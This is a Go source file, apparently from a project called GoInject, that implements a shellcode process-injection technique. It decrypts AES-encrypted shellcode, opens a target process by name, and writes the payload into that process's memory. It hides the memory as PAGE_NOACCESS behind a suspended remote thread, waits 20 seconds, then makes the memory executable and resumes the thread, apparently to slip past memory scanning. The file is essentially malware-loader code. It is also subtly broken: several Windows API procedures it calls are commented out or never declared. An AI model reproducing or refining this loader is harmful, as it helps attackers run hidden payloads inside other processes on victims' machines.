package techniques

import(
	"golang.org/x/sys/windows"
	"encoding/hex"
	"GoInject/findPID"
	"syscall"
	"unsafe"
	"GoInject/crypto"
	"time"
)

 var (
 	    kernel32           = syscall.MustLoadDLL("kernel32.dll")
 		// virtualAllocEx     = kernel32.MustFindProc("VirtualAllocEx")
 		// writeProcessMemory = kernel32.MustFindProc("WriteProcessMemory")
 		// virtualProtectEx   = kernel32.MustFindProc("VirtualProtectEx")
 		resumeThread = kernel32.MustFindProc("ResumeThread")
 )

func BlockAndWait(targetProcess string, shellcodeEncrypted string, key string){

    plaintext := crypto.DecryptAES(shellcodeEncrypted, key)

        shellcode, _ := hex.DecodeString(string(plaintext))

        pid, _ := findPID.ProcessID(targetProcess)

        //Get a handle on the process to inject to
        hProcess, _ := syscall.OpenProcess(0x001F0FFF, false, pid)

        //Allocate memory
        size := len(shellcode)
        address, _, _ := virtualAllocEx.Call(uintptr(hProcess), uintptr(0), uintptr(size), 0x3000, 0x04)
   

        //Copy shellcode to the allocated memory space
        var outSize uintptr
        writeProcessMemory.Call(uintptr(hProcess), address, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(size), outSize) //may have to change shellcode to []byte

        //Change initially set memory protections to PAGE_NOACCESS
        oldProtect := 123456
        noaccess := 0x01
        virtualProtectEx.Call(uintptr(hProcess), address, uintptr(size), uintptr(noaccess), uintptr(unsafe.Pointer(&oldProtect)))

        hThread, _, _ := createRemoteThread.Call(uintptr(hProcess), uintptr(0), 0, address, uintptr(0), windows.CREATE_SUSPENDED, uintptr(0))

        
        time.Sleep(20 * time.Second)

        virtualProtectEx.Call(uintptr(hProcess), address, uintptr(size), 0x40, uintptr(unsafe.Pointer(&noaccess)))

        resumeThread.Call(hThread)
}